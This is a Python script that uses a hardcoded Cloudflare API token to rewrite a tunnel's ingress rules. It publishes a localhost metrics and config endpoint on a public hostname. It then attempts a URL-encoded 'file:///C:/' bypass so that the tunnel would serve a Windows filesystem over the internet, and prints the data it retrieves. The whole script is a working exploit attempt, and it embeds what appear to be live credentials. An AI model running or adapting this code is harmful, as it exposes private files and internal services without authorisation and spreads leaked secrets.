import urllib.request
import json
import time

SUPER_TOKEN = "HBkXgm2nAYlRAhgyULBebnw-4a-HQ-Mcuv0U_W42"
ACCOUNT_ID = "4c2932bc3381be38d5266241b16be092"
TUNNEL_ID = "926eac5e-2642-4a16-9edc-c06b6c705ab8"


def api_request(method, url, data=None):
    headers = {
        "Authorization": f"Bearer {SUPER_TOKEN}",
        "Content-Type": "application/json",
    }
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode() if data else None,
        headers=headers,
        method=method,
    )
    try:
        with urllib.request.urlopen(req) as response:
            return json.loads(response.read().decode())
    except:
        return None


def check_metrics_and_bypass():
    res = api_request(
        "GET",
        f"https://api.cloudflare.com/client/v4/accounts/{ACCOUNT_ID}/cfd_tunnel/{TUNNEL_ID}/configurations",
    )
    config = res["result"]["config"]

    # 1. Update config for metrics
    config["ingress"] = [
        r for r in config["ingress"] if r.get("hostname") != "metrics.ai-smith.net"
    ]
    config["ingress"].insert(
        0, {"hostname": "metrics.ai-smith.net", "service": "http://localhost:20241"}
    )

    api_request(
        "PUT",
        f"https://api.cloudflare.com/client/v4/accounts/{ACCOUNT_ID}/cfd_tunnel/{TUNNEL_ID}/configurations",
        {"config": config},
    )

    print("Updated config for metrics. Waiting 10s...")
    time.sleep(10)

    # Check metrics
    import subprocess

    result = subprocess.run(
        ["curl", "-s", "https://metrics.ai-smith.net/metrics"],
        capture_output=True,
        text=True,
    )
    if result.stdout:
        print("METRICS DATA RECEIVED:")
        print(result.stdout[:500])

    # Check /config
    result = subprocess.run(
        ["curl", "-s", "https://metrics.ai-smith.net/config"],
        capture_output=True,
        text=True,
    )
    if result.stdout:
        print("CONFIG DATA RECEIVED:")
        print(result.stdout[:500])

    # 2. Try file:// bypass with URL encoding
    payload = "file%3A%2F%2F%2FC%3A%2F"
    print(f"Attempting file:// bypass with: {payload}")

    config["ingress"] = [
        r for r in config["ingress"] if r.get("hostname") != "files.ai-smith.net"
    ]
    config["ingress"].insert(0, {"hostname": "files.ai-smith.net", "service": payload})

    update_res = api_request(
        "PUT",
        f"https://api.cloudflare.com/client/v4/accounts/{ACCOUNT_ID}/cfd_tunnel/{TUNNEL_ID}/configurations",
        {"config": config},
    )
    if update_res and update_res.get("success"):
        print("File:// config accepted!")
        print("Waiting 10s...")
        time.sleep(10)
        result = subprocess.run(
            ["curl", "-s", "https://files.ai-smith.net/"],
            capture_output=True,
            text=True,
        )
        if result.stdout:
            print("FILE ACCESS SUCCESSFUL:")
            print(result.stdout[:1000])
    else:
        print("File:// config rejected.")


if __name__ == "__main__":
    check_metrics_and_bypass()
